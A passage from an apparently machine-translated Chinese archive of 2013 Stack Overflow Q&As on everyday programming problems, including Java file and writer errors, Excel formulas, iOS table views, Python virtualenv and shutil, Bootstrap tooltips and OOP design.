        }while(!userInput.equals(SENTINEL));
    }//end main
}//end class 
```

这里一切似乎都很好，但在我输入我的输入后，它就显示了这个错误。

```
 Exception in thread "main" java.io.FileNotFoundException: morsecode.txt (The system cannot find the file specified)
at java.io.FileInputStream.open(Native Method)
at java.io.FileInputStream.<init>(FileInputStream.java:138)
at java.util.Scanner.<init>(Scanner.java:656)
at morse.code.MorseCode.translateHere(MorseCode.java:30)
at morse.code.MorseCodeTester.main(MorseCodeTester.java:23) 
```

`Java Result: 1`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:37:56.220

如果您阅读[文档](http://docs.oracle.com/javase/6/docs/api/java/io/FileNotFoundException.html)，您会知道当 JVM 找不到文件时会引发此异常。我怀疑您需要更新`String line, file = "morsecode.txt"; //`以准确反映`morsecode.txt`文件的位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-31T20:16:00.867

如果你想要的话，我有一个莫尔斯电码转换器。它使点为 - 和破折号为 --- 但如果你愿意，你可以改变它。

```
import java.util.Scanner;

public class Test {

    /**
     * @param args
     */
    public static void main(String[] args) {
        System.out.println("Enter Text For Conversion to Morse Code");

        Scanner scan = new Scanner(System.in);
        String s = scan.nextLine();
        System.out.println(print(toMorse(s)));
    }

    static boolean[] toMorse(String input) {
        boolean output[] = new boolean[0];
        for (int i = 0; i < input.length(); i++) { // Every character
            char onChar = input.charAt(i);
            output = addCharacter(output, onChar);
        }
        return output;

    }

    static boolean[] addCharacter(boolean[] input, char character) {
        character = Character.toLowerCase(character);
        if (character == 'a') {
            input = dot(input);
            input = dash(input);
        }
        if (character == 'b') {
            input = dash(input);
            input = dot(input);
            input = dot(input);
            input = dot(input);
        }
        if (character == 'c') {
            input = dash(input);
            input = dot(input);
            input = dash(input);
            input = dot(input);
        }
        if (character == 'd') {
            input = dash(input);
            input = dot(input);
            input = dot(input);
        }
        if (character == 'e') {
            input = dot(input);
        }
        if (character == 'f') {
            input = dot(input);
            input = dot(input);
            input = dash(input);
            input = dot(input);
        }
        if (character == 'g') {
            input = dash(input);
            input = dash(input);
            input = dot(input);
        }
        if (character == 'h') {
            input = dot(input);
            input = dot(input);
            input = dot(input);
            input = dot(input);
        }
        if (character == 'i') {
            input = dot(input);
            input = dot(input);
        }
        if (character == 'j') {
            input = dot(input);
            input = dash(input);
            input = dash(input);
            input = dash(input);
        }
        if (character == 'k') {
            input = dash(input);
            input = dot(input);
            input = dash(input);
        }
        if (character == 'l') {
            input = dot(input);
            input = dash(input);
            input = dot(input);
            input = dot(input);
        }
        if (character == 'm') {
            input = dash(input);
            input = dash(input);
        }
        if (character == 'n') {
            input = dash(input);
            input = dot(input);
        }
        if (character == 'o') {
            input = dash(input);
            input = dash(input);
            input = dash(input);
        }
        if (character == 'p') {
            input = dot(input);
            input = dash(input);
            input = dash(input);
            input = dot(input);
        }
        if (character == 'q') {
            input = dash(input);
            input = dash(input);
            input = dot(input);
            input = dash(input);
        }
        if (character == 'r') {
            input = dot(input);
            input = dash(input);
            input = dot(input);
        }
        if (character == 's') {
            input = dot(input);
            input = dot(input);
            input = dot(input);
        }
        if (character == 't') {
            input = dash(input);
        }
        if (character == 'u') {
            input = dot(input);
            input = dot(input);
            input = dash(input);
        }
        if (character == 'v') {
            input = dot(input);
            input = dot(input);
            input = dot(input);
            input = dash(input);
        }
        if (character == 'w') {
            input = dot(input);
            input = dash(input);
            input = dash(input);
        }
        if (character == 'x') {
            input = dash(input);
            input = dot(input);
            input = dot(input);
            input = dash(input);
        }
        if (character == 'y') {
            input = dash(input);
            input = dot(input);
            input = dash(input);
            input = dash(input);

        }
        if (character == 'z') {
            input = dash(input);
            input = dash(input);
            input = dot(input);
            input = dot(input);
        }
        if (character == ' ') {
            input = add(input, false);
            input = add(input, false);
            input = add(input, false);
            input = add(input, false);
        }
        if (character == '1') {
            input = dot(input);
            input = dash(input);
            input = dash(input);
            input = dash(input);
            input = dash(input);

        }
        if (character == '2') {
            input = dot(input);
            input = dot(input);
            input = dash(input);
            input = dash(input);
            input = dash(input);

        }
        if (character == '3') {
            input = dot(input);
            input = dot(input);
            input = dot(input);
            input = dash(input);
            input = dash(input);

        }
        if (character == '4') {
            input = dot(input);
            input = dot(input);
            input = dot(input);
            input = dot(input);
            input = dash(input);

        }
        if (character == '5') {
            input = dot(input);
            input = dot(input);
            input = dot(input);
            input = dot(input);
            input = dot(input);

        }
        if (character == '6') {
            input = dash(input);
            input = dot(input);
            input = dot(input);
            input = dot(input);
            input = dot(input);

        }
        if (character == '7') {
            input = dash(input);
            input = dash(input);
            input = dot(input);
            input = dot(input);
            input = dot(input);

        }
        if (character == '8') {
            input = dash(input);
            input = dash(input);
            input = dash(input);
            input = dot(input);
            input = dot(input);

        }
        if (character == '9') {
            input = dash(input);
            input = dash(input);
            input = dash(input);
            input = dash(input);
            input = dot(input);

        }
        if (character == '0') {
            input = dash(input);
            input = dash(input);
            input = dash(input);
            input = dash(input);
            input = dash(input);
        }

        return input;
    }

    static boolean[] dot(boolean[] input) {
        input = add(input, true);
        input = add(input, false);
        return input;
    }

    static boolean[] dash(boolean[] input) {
        input = add(input, true);
        input = add(input, true);
        input = add(input, true);
        input = add(input, false);
        return input;
    }

    static boolean[] add(boolean[] input, boolean add) {
        int length = input.length;

        boolean[] newArray = new boolean[length + 1];
        for (int i = 0; i < length; i++) {
            newArray[i] = input[i];

        }
        newArray[length] = add;

        return newArray;

    }

    static String print(boolean[] input) {
        String output = "";
        for (int i = 0; i < input.length; i++) {
            if (input[i]) {
                output = output + "-";
            }
            if (!input[i]) {
                output = output + " ";
            }

        }

        return output;
    }

} 
```

# javascript - 与 window.history.back() 不一致

> ID：15750407
> 
> 赞同：4
> 
> 时间：2013-04-01T19:34:36.927
> 
> 标签：javascript, jquery

我在用于测试 window.history.back() 的 MVC 视图中有以下代码

![在此处输入图像描述](https://i.stack.imgur.com/q9giz.png)

如果用户单击段落标记中的链接（以红色突出显示），window.history.back() 将按我的预期执行。它带我回到前一页，并在该页面上保持状态。但是，如果用户单击按钮，我不会得到相同的行为。当前视图被重新加载，或者至少尝试重新加载当前页面。但它失败了。不管是执行 jQuery，还是我将 window.history.back() 调用放在 Button onClick 中，都会发生同样的事情。

一条可能有用的信息。该按钮位于 HTML.BeginForm 内，段落标记中的行不在。

有谁知道为什么会这样？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-01T19:45:42.010

浏览器可能将按钮解释为提交按钮并提交表单，从而导致页面刷新。添加`type="button"`将防止这种情况。

```
<button type="button">Cancel</button> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-01T19:37:37.623

```
$('#cancelButton').click(function(e){
    e.preventDefault();

    /* ... code ... */
}); 
```

# java - BufferedWriter 停止写入

> ID：15750408
> 
> 赞同：0
> 
> 时间：2013-04-01T19:34:38.243
> 
> 标签：java, bufferedwriter

我正在尝试重写这本字典：[dictionary.txt](http://docs.oracle.com/javase/tutorial/collections/interfaces/examples/dictionary.txt "80368 字")按长度而不是按字母顺序排序。我有以下代码（在 main(String[] args) 内）：

```
 BufferedReader read = new BufferedReader(new FileReader(new File(DIC_READ_PATH)));
    BufferedWriter write= new BufferedWriter(new FileWriter(DIC_WRITE_PATH),1);
    ArrayList<String> toWrite = new ArrayList<String>();
    for (int a = read.read(); a != -1; a = read.read()){
        char c = (char) a;
        toWrite.add("" + c + read.readLine());
    }
    read.close();
    Collections.sort(toWrite, new MyComparator());
    for (int a = 0; a <= 70000; a += 10000){
        write.write(toWrite.subList(a, a + 10000).toString().replaceAll("[\\[,\\]]", "").replaceAll(" ", "\n"));
        write.flush();
    }

    write.write(toWrite.subList(80000, toWrite.size()).toString().replaceAll("[\\[,\\]]", "").replaceAll(" ", "\n"));
    write.close(); 
```

我的比较器：

```
public class MyComparator implements Comparator<String> {
@Override
    public int compare(String arg0, String arg1) {
    // TODO Auto-generated method stub
        if (arg0.length() == arg1.length()){
            return arg0.compareTo(arg1); 
        } 
        return arg0.length() < arg1.length() ? -1 : +1;
    }
} 
```

它对 Arraylist 进行了很好的排序，但是当我编写字符串时，它不会写 8 个单词。我尝试改变 BufferedWriter 上的缓冲区，发现较小的缓冲区有帮助，所以我将缓冲区设置为 1。我发现了这个：[Buffered Writer Java Limit / Issues](https://stackoverflow.com/questions/15623374/buffered-writer-java-limit-issues)并尝试在每次写入和最后关闭时刷新（之后甚至改变缓冲区）。我仍然得到 80360 字而不是 80368。为什么它不写完整的单词列表？我必须使用另一个 BufferedWriter 吗？如果是这样，我如何使用它而不覆盖已经写入的内容？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:49:31.043

您正在使用输入数据的随机字符：

```
for (int a = read.read(); a != -1; a = read.read()){ 
```

不要混和`read()`打电话`readLine()`。只需使用`readLine()`并测试null。

另外，要编写结果，不要使用 List.toString impl 和讨厌的正则表达式替换，只需遍历列表并写一个单词后跟一个换行符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:53:27.743

我认为问题出在这里：

```
 for (int a = 0; a <= 70000; a += 10000){
        write.write(toWrite.subList(a, a + 10000).toString().replaceAll("[\\[,\\]]", "").replaceAll(" ", "\n"));
        write.flush();
    } 
```

你应该 write.write("\n"); 冲洗前。

# excel - 将 Excel 中的行增加一 (1) 到第 100 行，重复直到达到第 25000 行

> ID：15750410
> 
> 赞同：1
> 
> 时间：2013-04-01T19:34:49.347
> 
> 标签：excel

我有一个电子表格，其中我将单元格中的值/字符串增加一到第 25000 行 =“User_”&ROW(A1) 或 =CONCATENATE("User_",ROW(A1),"@mail.com")

这工作正常。

现在，我的问题是如何在我想将每行的值增加一到 100 但又想从一开始的地方放置一个条件？

用户_1

用户_2

用户_3

'

'

用户_100

用户_1

用户_2

'

'

用户_200

用户_1

'

'

用户_25000

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T21:01:54.147

```
=IF( MOD(ROW()-1,100)=0,ROW()-1,MOD(ROW()-1,100) ) 
```

If you have headers.

And with the email info it should be like:

> ="User_" & IF(MOD(ROW()-1,100)=0,ROW()-1,MOD(ROW()-1,100)) & "@mail.com"

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:39:08.990

而不是`ROW(A1)`（或简单地`ROW()`），使用`IF(MOD(ROW(),100)=0,ROW,MOD(ROW,100))`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-21T16:45:05.683

```
="User_"&MOD(ROW()-2,100)+1&"@mail.com" 
```

这`-2`是因为您说它从第 2 行开始，所以如果它从另一行开始，请将 2 替换为该数字。

`100`在重复之前用您希望它上升的任何数字替换。

这`+1`是为了消除`IF`这个问题的其他答案所需的逻辑。

对不起，这是在问题发生之后，但希望它会帮助别人！

**额外提示 - 如果您希望它是“User_001@mail.com”（将数字填充为 3 位数字），请使用 TEXT 函数，如下所示：`="User_"&TEXT(MOD(ROW()-2,100)+1,"000")&"@mail.com"`

# netbeans-7 - 如何在 netbeans 7.3 中安装 zend 框架 2

> ID：15750418
> 
> 赞同：2
> 
> 时间：2013-04-01T19:35:14.573
> 
> 标签：netbeans-7, netbeans-7.3

我已经在 netbeans 7.3 中安装了插件 php zend framework 2

但我无法创建 zendFrameWork2 项目！

如何在 netbeans 7.3 中安装 zend 框架 2？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-10T21:25:02.263

您需要下载 Zend Skeleton 应用程序

[http://framework.zend.com/downloads/skeleton-app](http://framework.zend.com/downloads/skeleton-app)

像这样 zendframework-ZendSkeletonApplication-zf-release-2.1.0-20-g619a8d7.zip

下一个

你需要去[http://getcomposer.org/download/](http://getcomposer.org/download/)

并下载windows安装程序

这个安装程序需要找到你的 php.exe 文件

一般在 C:\xamp\php\php.exe

并安装这个

现在找到你的 composer.phar 文件

好的，这就是全部

# speech-recognition - 在 Julius 中获取处理时间

> ID：15750419
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:35:27.483
> 
> 标签：speech-recognition

这个想法是估计 Julius 每秒语音需要多少处理时间。

使用`Recog *recog`它可以直接确定语音通过多长时间，`(float)recog->speechlen / (float)recog->jconf->input.sfreq`但我找不到任何地方表明它需要多少处理时间。

有没有人解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-30T20:37:01.777

您需要`callback_add`与事件`CALLBACK_EVENT_RECOGNITION_BEGIN`和`CALLBACK_EVENT_RECOGNITION_END`. 保存开始时的初始时间，结束时的差就是持续时间。

# iphone - 根据 UIPickerView 选择更新 UITableView 内容

> ID：15750422
> 
> 赞同：0
> 
> 时间：2013-04-01T19:35:40.420
> 
> 标签：iphone, ios, objective-c, uitableview, uipickerview

我有一个包含两个部分的 tableView 的视图控制器。第 1 节只有一行，第 2 节有一些没有行数限制的数组。

当我单击第 1 节中的单元格时，我有一个 pickerView 出现在操作表中。无论我在我的 pickerView 上选择什么组件，都会成为第 1 节单元格上的标题。

现在我的问题，

我的 tableView 第 2 节的内容可以依赖第 1 节中单元格的标题文本吗？

例如：

```
if Section 1's text is = "String A", Section 2's contents should be = "Array A"
if Section 1's text is = "String B", Section 2's contents should be = "Array B"
if Section 1's text is = "String C", Section 2's contents should be = "Array C"
if Section 1's text is = "String D", Section 2's contents should be = "Array D" 
```

等等...

另外，我希望 tableView 更新其内容，因为我用所需的字符串关闭了 pickerView。非常感谢一些示例代码/参考。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:51:39.060

一个好的解决方案是创建一个枚举变量来存储用户的选择，然后使用它来确定表格视图的内容。这是一些示例代码：

```
typedef enum { SelectionA, SelectionB, SelectionC } Selection;

@interface MyViewController : UITableViewController (UITableViewDataSource, UITableViewDelegate)

@property (nonatomic) Selection selection;
@property (nonatomic, strong) NSMutableArray *arrayA;
@property (nonatomic, strong) NSMutableArray *arrayB;
@property (nonatomic, strong) NSMutableArray *arrayC;

@end

@implementation MyViewController

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
  NSInteger num = 0;
  if(section==0) {
    num = 1;
  }
  else {
    switch(self.selection)
    {
       case SelectionA: num = [self.arrayA count]; break;
       case SelectionB: num = [self.arrayB count]; break;
       case SelectionC: num = [self.arrayC count]; break;
    }
  }

  return num;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

  NSString *cellText = nil;
  if(indexPath.section==0) {
    switch(self.selection)
    {
       case SelectionA: cellText = @"String A"; break;
       case SelectionB: cellText = @"String A"; break;
       case SelectionC: cellText = @"String A"; break;
    }
  }
  else {
    switch(self.selection)
    {
       case SelectionA: cellText = [self.arrayA objectAtIndex:indexPath.row]; break;
       case SelectionB: cellText = [self.arrayA objectAtIndex:indexPath.row]; break;
       case SelectionC: cellText = [self.arrayA objectAtIndex:indexPath.row]; break;
    }
  }

  static NSString *CellIdentifier = @"Cell";

  UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
  if (cell == nil) {
        cell = [[UITableViewCell alloc]
           initWithStyle:UITableViewCellStyleDefault
           reuseIdentifier:CellIdentifier];
  }

  cell.textLabel.text = cellText;
}

@end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:55:06.690

设置第 1 节的标题

```
- (void)pickerView:(UIPickerView *)pickerView didSelectRow:(NSInteger)row inComponent:(NSInteger)component
{
   UITableViewCell *cell = (UITableViewCell *)sender.superview;
   cell.textLabel.text = [NSString stringWithFormat:@"%@",[self.listOfPickerData objectAtIndex:row]];

    [self customeMethod];
  [self.tabelView reloadData];
} 
```

为您的阵列基于选定的派克视图的行

```
-(void)customeMethod
{
    int row = [repeatPickerView selectedRowInComponent:0];
    self.selectedRowFromPicker = [repeatPickerData objectAtIndex:row];

   if([self.selectedRowFromPicker isEqualToString:@"piker row 1 "])
   {
     // NSArray *myArray1......
   }
   eles if([self.selectedRowFromPicker isEqualToString:@"piker row 2 "])
   {
     // NSArray *myArray2......
   }
   else
   {
     // NSArray *myArray3......
   }
} 
```

# android - 是否可以使用 root 访问权限调用 ndk 库？

> ID：15750427
> 
> 赞同：2
> 
> 时间：2013-04-01T19:36:03.707
> 
> 标签：android, c++, sockets

您好，我想在我的本机代码中创建一个套接字，以便通过使用这样的套接字来实现更快速的 ping 功能：

```
if ( (socketid = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)
    {
        perror("socket");   /* probably not running as superuser */
        __android_log_print(ANDROID_LOG_DEBUG,TAG,"socket error: ret %d error: %d",socketid,errno);
        return false;
    } 
```

但是我意识到这会返回 1 的 errno（EPERM 或不允许操作），奇怪的是我设置了 INTERNET 权限，而我的 android 设备是 x86 模拟器（所以是 root 的），我在某处读到这是不可能的本地方式但我在这里问是否有任何解决方案或假设目前完全不可能。

# python - 导入自定义模块的 Pythonic 方式？

> ID：15750428
> 
> 赞同：1
> 
> 时间：2013-04-01T19:36:10.853
> 
> 标签：python, virtualenv

我需要处理这个问题已经有一段时间了，但从未真正弄清楚为自定义模块导入/设置 PYTHONPATH 的最 Pythonic 方式是什么。我知道我可以使用 virtualenv 来管理它，我知道我可以在脚本中或通过 pth 文件设置它，但这些对我来说似乎都不是很干净和 Pythonic，所以我猜我错过了一些东西。

几乎总是，我感兴趣的所有自定义模块都包含在我克隆下来的 git 目录中，该目录包含我正在运行的任何脚本，如果这样可以简化事情的话。

我猜 virtualenv 是答案，但我想我会问，以防我遗漏任何东西。

**编辑：**澄清一下，这只是一个关于自定义模块的问题。我已经将 pip 用于 PyPI 的模块。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:43:27.037

virtualenv 是一个好的开始。

还有像 pip 和 easy_install 这样的包管理器来管理第三方模块。

在代码中，您可以使用：

```
import sys
sys.path.append('/path/to/customModule') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:48:42.133

Virtualenv 是解决这个问题的方法。

```
pip install virtualenv 
```

然后创建一个文件夹来设置您的环境。在那个文件夹里面：

```
virtualenv <new_env_name> 
```

这将在该目录中创建一个新文件夹，其中有一个 bin 文件夹，在该 bin 文件夹中运行 source on activate 。然后您可以执行 pip install ，它只会为该环境安装它。

如果您正在克隆一个 git 存储库，并且您还希望能够轻松地阅读代码（例如，如果您也在处理该存储库）将其克隆到您的 work_dir 中，然后将包文件夹符号链接或别名到站点包中该 virtualenv 的 lib 目录中的目录。否则，如果您执行 python setup.py install 它正确打包，它应该为该 virtualenv 正确安装它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-11T22:34:46.893

您也可以使用 pip 安装不在 PyPI 上的软件包。你只需要一个 URI 端点和一个有效的 python 包：

例子：

```
$ pip install https://github.com/pypa/pip/archive/develop.zip#egg=pip
$ pip install git+https://github.com/pypa/pip.git#egg=pip
$ pip install git+git://github.com/pypa/pip.git#egg=pip
$ pip install /path/to/pip.tar.gz
$ pip install . 
```

阅读更多[https://pip-installer.org/en/latest/usage.html#pip-install](https://pip-installer.org/en/latest/usage.html#pip-install)

# python - 将 shutil.make_archive 与 zipfile.ZIP_STORED 一起使用？

> ID：15750429
> 
> 赞同：1
> 
> 时间：2013-04-01T19:36:14.393
> 
> 标签：python, compression, zip, zipfile, shutil

在 Python 中，有没有办法使用将`shutil.make_archive()`文件压缩设置为的函数`zipfile.ZIP_STORED`？（即未压缩）

文档显示有很多可选参数，但都没有设置文件压缩：

```
shutil.make_archive(base_name, format[, root_dir[, base_dir[, verbose[, dry_run[, owner[, group[, logger]]]]]]]) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:45:03.243

不，没有办法做到这一点`shutil.make_archive`。

[如果文档](http://docs.python.org/3/library/shutil.html#shutil.make_archive)中缺少相关标志不足以证明，您可以查看[源代码](http://hg.python.org/cpython/file/3.4/Lib/shutil.py#l740)。

特别是，在[第 683 行](http://hg.python.org/cpython/file/3.4/Lib/shutil.py#l683)，您可以看到`compression=zipfile.ZIP_DEFLATED`如果您的 Python 具有该模块，它会显式传递，而第[634 行](http://hg.python.org/cpython/file/3.4/Lib/shutil.py#l634)`zipfile`的后备代码除了命令行工具之外没有传递任何参数。`-r``-q``zip`

这是一个高级函数，可以使琐碎的情况更容易；如果您想做任何`zip`/ `tar`/ `gztar`/特定的事情`bztar`，您可以并且应该使用底层库。

当然，如果您经常需要这个，您可以编写自己的`make_archive`类似包装器（只需将相关代码复制出来`shutil`并修改您的副本）。

# javascript - twitter 引导工具提示的垂直偏移

> ID：15750430
> 
> 赞同：3
> 
> 时间：2013-04-01T19:36:15.183
> 
> 标签：javascript, twitter-bootstrap

我有几个元素动态添加到页面中，每个元素都分配了 twitter-bootstrap 工具提示。但是，这些动态添加的对象有一些垂直偏移，这会阻止工具提示准确对齐（它们需要向下移动大约 15 像素）。那么我的问题是，如何在渲染时将每个工具提示（当前绑定的和未绑定的）重新定位到当前位置下方 15 像素？

如果当前正在显示工具提示，则以下内容会处理偏移量，但不能主动工作（未来的工具提示将显示没有偏移量）：

```
$('.tooltip').css('top',parseInt($('.tooltip').css('top')) + 15 + 'px') 
```

我不知道将其绑定到哪种事件才能将其应用于任何出现在屏幕上的工具提示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T14:09:20.443

您的工具提示是如何被激活的？如果您使用默认的“悬停”，则可以在元素悬停时分配一个函数，然后使用 .css 重新定位 .tooltip 元素，如下所示：

```
$("[data-toggle=tooltip]").tooltip();
$("[data-toggle=tooltip]").hover(function(){
    $('.tooltip').css('top',parseInt($('.tooltip').css('top')) + 15 + 'px')
}); 
```

在 Bootply 上工作：http: [//bootply.com/59977](http://bootply.com/59977)

您可能需要将 更改`$("[data-toggle=tooltip]")`为您用于工具提示的任何选择器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-19T02:04:00.140

我们必须添加 'handlerOut' 回调来补偿偏移量，否则工具提示会在消失之前再次添加偏移量：

```
 $('[data-toggle="tooltip"]').tooltip();
    $('[data-toggle="tooltip"]').hover(function(){
        $('.tooltip').css('top',parseInt($('.tooltip').css('top')) + 20 + 'px')            
    },
    function () {
        $('.tooltip').css('top', parseInt($('.tooltip').css('top')))
    }); 
```

# iphone - 没有在计时器Objective-C上调用委托

> ID：15750431
> 
> 赞同：0
> 
> 时间：2013-04-01T19:36:15.213
> 
> 标签：iphone, location, cllocation

我只是想知道是否有人可以再次帮助我？我已将我的位置编码从我的视图控制器移动到一个 NSObject 中。然后我从 App Delegate 调用了这个

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
//Updating Location
[Location sharedLocation];

//Timer for reloading the XML
recheckTimer = [NSTimer scheduledTimerWithTimeInterval:30 target:self selector:@selector(recheckLocation) userInfo:nil repeats:YES];
return YES:
} 
```

我已经设置了一个计时器，以便我希望这个过程再次运行

```
-(void)recheckLocation
{
  //Updating Location
  [Location sharedLocation];
  NSLog(@"Timer Triggered");
} 
```

唯一的问题是当计时器触发共享位置时不会再次更新？请问有人可以提前帮忙吗？非常感谢，乔恩。

```
#import "Location.h"

@implementation Location

@synthesize locationManager;

- (id)init {
  self = [super init];

  if(self) {
    self.locationManager = [CLLocationManager new];
    [self.locationManager setDelegate:self];
    [self.locationManager setDistanceFilter:500];//Metres
    [self.locationManager setHeadingFilter:90];
    [self.locationManager startMonitoringSignificantLocationChanges];
  }
  return self;
}

+ (Location*)sharedLocation {
  static Location* sharedLocation;
  if(!sharedLocation) {
    @synchronized(sharedLocation) {
      sharedLocation = [Location new];
    }
  }

  return sharedLocation;
}

//LOCATION CODING
- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error
{
NSLog(@"didFailWithError' %@", error);
UIAlertView *errorAlert = [[UIAlertView alloc]initWithTitle:@"Error" message:@"Failed to Get Your Current Location" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil];

 [errorAlert show];
}

- (void)locationManager:(CLLocationManager *)manager didUpdateToLocation:(CLLocation *)newLocation fromLocation:(CLLocation *)oldLocation
{
  NSLog(@"didUpdateToLocation: %@", newLocation);
  CLLocation *currentLocation = newLocation;

  if (currentLocation != nil) {

    //Resolve Web Address
    webAddressResolved = [NSString stringWithFormat:@"XZYYFASDFA%f,%f.xml", currentLocation.coordinate.latitude, currentLocation.coordinate.longitude];
    NSLog(@"Address Resolved %@", webAddressResolved);
  }

  //Stop Location Manager
  [locationManager stopMonitoringSignificantLocationChanges];

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T06:43:33.840

好吧，你在这里定义的是一个单独的位置，共享位置的目的似乎并没有像代码注释中所说的那样更新位置

sharedInstance 所做的是返回一个已初始化的引用，并且在整个代码中的任何地方都使用相同的引用。它为您提供位置实例作为回报，您不会在任何地方检索并使用它。您只需调用它但不使用它.

定义一个方法来更新位置并在使用从位置获取内存后调用它

```
Location *sharedLoc=[Location sharedLocation]; 
```

并调用方法将位置更新为

```
[sharedLoc updateLocation]; 
```

位置.h

```
-(void)updateLocation; 
```

在位置 .m

```
-(void)updateLocation
{
//Code for updation purpose
} 
```

# c# - 何时检查对象的状态，一般 OOP，C# 中的示例

> ID：15750432
> 
> 赞同：5
> 
> 时间：2013-04-01T19:36:17.570
> 
> 标签：c#, oop

我不太清楚如何用一句话来表达这个问题，所以我很难搜索以前的帖子。这对我来说经常出现，我想就如何处理它达成共识。

假设您有两个班级，`ExampleClass`并且`ExampleClassManager`. `ExampleClass`有一个`Update(Data data)`从 调用的方法`ExampleClassManager`。但是，`ExampleClass`可以处于两种状态之一，在`Enabled`它想要处理`data`传递给它的状态下`Update`，在*禁用*状态下它根本不做任何事情`data`。

如果它被*禁用*，我应该检查状态`ExampleClassManager`并且根本不通过，还是应该通过不管并在其中忽略它？`data`*`data``ExampleClass`*

 *这是一个代码示例，以防我没有清楚地表达它。

```
public class ExampleClass {
    public bool Enabled {
        get;
        set;
    }

    public void Update(Data data) {
        if(Enabled) {
            //do stuff with data
        }
    }
}

public class ExampleClassManager {
    private List<ExampleClass> exampleClassList=new List<ExampleClass>();

    public void UpdateList() {
        foreach(ExampleClass exampleClass in exampleClassList) {
            exampleClass.Update(data);
        }
    }
} 
```

或者

```
public class ExampleClass {
    public bool Enabled {
        get;
        set;
    }

    public void Update(Data data) {
        //do stuff with data
    }
}

public class ExampleClassManager {
    private List<ExampleClass> exampleClassList=new List<ExampleClass>();

    public void UpdateList() {
        foreach(ExampleClass exampleClass in exampleClassList) {
            if(exampleClass.Enabled) {
                exampleClass.Update(data);
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:39:30.913

鉴于它取决于 的属性`ExampleClass`，我会选择选项 1 并在`ExampleClass.Update`. 否则，任何可以访问对象的`ExampleClass`对象都可以调用`Update` *而不管*状态如何。通过在`Update`方法内进行检查，您可以确保仅在启用对象时才会继续。这里的问题是谁能改变对象的状态？

参见得[墨忒耳法则](http://en.wikipedia.org/wiki/Law_of_Demeter)：

> 每个单元应该只对其他单元有有限的了解：只有与当前单元“密切”相关的单元。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:49:30.957

“我的经理班应该做多少管理？” 您的选项 2 是“微观管理”方法 - 经理应该向 ExampleClass 规定每个小细节，说明它应该做什么以及如何做。

通常，这比面向对象的编程更基于结构的编程。我希望你的经理告诉你的对象“去做这个”，而不是担心细节。ExampleClass 应该在内部封装它的所有行为，而不是强迫管理器担心它。

我投票支持选项 1，但需要注意的是，这些是一般原则，您总能找到需要选项 2 的情况。

要问的一个问题 - 除了让经理检查之外，ExampleClass.Enabled.get 是公开的还有其他原因吗？如果这是它公开的唯一原因，那么它是内部实现，并且 gettor 应该是私有的。如果你有很多关于这个领域的事情，那可能意味着你的选项 2 工作流程对于这门课来说更自然。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T19:52:01.280

我会选择选项 2，classManager 应该管理对象，他应该知道是否触发更新。单个对象的更新方法应该做它所说的（更新对象而不是什么都不做）。

@caerolus：我还不能发表评论......无论如何，给出的例子都没有违反 demeter 定律

无论如何，我认为这是一个有点个人选择的问题，也许它更适合堆栈交换？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T20:31:39.447

假设您有两个对象，Company 和 Employee。你让公司检查员工什么时候饿了，或者你让员工检查他是否饿了？听起来你想让员工检查他是否饿了，对吧？但是如果公司要为所有员工订餐怎么办，那么公司需要检查员工是否饿了。

所以我的观点是，这取决于何时检查、谁在检查以及为什么检查的设计和上下文。在您的示例中，我会说这没关系，因为没有设置上下文。*

# java - 关闭 Java 框架

> ID：15750433
> 
> 赞同：0
> 
> 时间：2013-04-01T19:36:18.980
> 
> 标签：java, netbeans

我创建了一个 java 游戏并实现了一个 GameOver 方法。这是我的游戏结束方法的代码：

```
public void gameOver() throws IOException {
   String message = "Game, Want to try Again?";
   String title = "Game Over";
   int reply = JOptionPane.showConfirmDialog(frame, message, title, JOptionPane.YES_NO_OPTION);
    if (reply == JOptionPane.YES_OPTION){
        new Game();
    } else {
        this.getSoundEffect().stopAllMusic();
        new Main().setVisible(true);
    }
} 
```

我遇到的一个问题是关闭原始框架。例如，如果我单击是，游戏框架将打开，但是，它已经打开，所以我将有两个游戏实例工作。

只是为了让你们知道，我尝试了以下选项：

```
 frame.dispose();

    WindowEvent wev = new WindowEvent(this, WindowEvent.WINDOW_CLOSING);
    Toolkit.getDefaultToolkit().getSystemEventQueue().postEvent(wev);

    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); 
```

我也在考虑做一个 actionperformed 事件，但是，由于 JOptionPane 是一个 int，我无法做到。

* * *

## 回答 #1

> 赞同：0
> 
